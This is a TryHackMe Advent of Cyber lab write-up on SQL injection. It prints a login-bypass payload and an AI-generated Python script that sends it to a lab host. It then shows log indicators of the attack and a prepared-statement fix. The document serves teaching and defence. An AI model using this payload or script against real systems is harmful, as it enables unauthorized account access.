# 🎄 Advent of Cyber 2025 - Day 4: AI in Cybersecurity

**Category:** Red Teaming / Blue Teaming / Secure Coding
**Platform:** TryHackMe
**Tools Used:** AI Assistant (Van SolveIT), Python, Log Analysis
**Topic:** Automating Exploitation & Remediation of SQL Injection

## 1. Executive Summary

This engagement explored the role of Artificial Intelligence in the cybersecurity lifecycle within *The Best Festival Company* (TBFC) infrastructure. Acting as a Red Teamer, Blue Teamer, and Software Developer, I utilized an AI assistant to identify, exploit, detect, and remediate a critical **SQL Injection (SQLi)** vulnerability in a web application's login portal.

The assessment demonstrated how AI can accelerate offensive scripting, simplify forensic log analysis, and provide secure coding recommendations, highlighting the need for "Defense in Depth".

---

## 2. Phase 1: Red Team (Automated Exploitation)

### 2.1 Vulnerability Discovery
The target application contained a logic flaw in the authentication mechanism. By injecting a specific SQL payload into the username field, it was possible to alter the database query logic to bypass the password check completely.

**The Payload:**
```sql
alice' OR 1=1 -- -
```
* **Analysis:** The `'` character closes the username string. `OR 1=1` creates a tautology (a condition that is always true), forcing the database to return the first record, which is typically the Administrator. The `-- -` sequence comments out the rest of the query, removing the password validation.

### 2.2 AI-Assisted Automation
Instead of manual entry, I leveraged the AI assistant to generate a Python script to automate this attack. This demonstrates how attackers use AI to weaponize vulnerabilities quickly.

**Exploit Script (Python):**
```python
import requests

url = "http://MACHINE_IP:5000/login.php"
# The payload forces a login bypass
payload = {
    "username": "alice' OR 1=1 -- -",
    "password": "anything" 
}

# Sending the malicious POST request
response = requests.post(url, data=payload)

if "Welcome" in response.text:
    print("[+] Login Successful! Admin access granted.")
    print(response.text)
else:
    print("[-] Exploit failed.")
```
> **Result:** The script successfully bypassed the login and retrieved the Admin Flag (`THM{SQLI_EXPLOIT}`), confirming the vulnerability.


---

## 3. Phase 2: Blue Team (Log Analysis)

After the attack, the focus shifted to **Digital Forensics**. The goal was to investigate the server logs to identify the traces left by the automated exploit and create a detection signature.

**Log Entry Found:**
```log
198.51.100.22 - - [03/Oct/2025:09:03:11] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"
```

### 3.1 Indicators of Compromise (IoCs)
The AI assistant helped decode and interpret the raw log data to extract actionable intelligence:

1.  **Status Code 200 (OK):** The server accepted the request. A failed login attempt usually returns a 401 (Unauthorized) or 403 (Forbidden). A 200 status code on a login endpoint combined with a suspicious payload is a strong indicator of a successful breach.
2.  **User-Agent (`python-requests`):** The attacker failed to spoof the User-Agent string. This explicitly identifies the traffic as originating from an automated Python script rather than a legitimate user browser (e.g., Chrome/Firefox).
3.  **URL Encoded Payload:** The log contains `%27` (single quote) and `OR+1%3D1` (`OR 1=1`), which are clear signatures of a SQL Injection attempt.


---

## 4. Phase 3: Software Security (Remediation)

The final phase involved a **Source Code Review** to identify the root cause of the vulnerability and apply a patch.

**Vulnerable Code (PHP):**
```php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';
// Vulnerability: Variables are likely concatenated directly into SQL
```
**Root Cause:** The application accepts **raw user input** (`$_POST`) and processes it without any sanitization or parameterization. This allows interpreted characters (like `'`) to modify the SQL command structure.

### 4.2 The Fix: Prepared Statements
To patch this vulnerability, the code must be refactored to use **Prepared Statements**. This ensures the database treats user input strictly as data, never as executable code.

**Secure Implementation:**
```php
// Using PDO Prepared Statements
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');
// The input is bound to the placeholder, neutralizing the SQLi
$stmt->execute(['username' => $user]);
$result = $stmt->fetch();
```

---

## 5. Key Takeaways

* **Lifecycle of a Vulnerability:** This exercise covered the complete path: Exploitation (Red) -> Detection (Blue) -> Remediation (AppSec).
* **AI Utility:** AI proved effective in generating attack scripts and explaining complex log entries, acting as a force multiplier for security teams.
* **Defense in Depth:** The most effective defense combines secure coding practices (Prepared Statements) with active monitoring (Log Analysis) to detect anomalous behavior.

---
*Author: [Ramotech]*
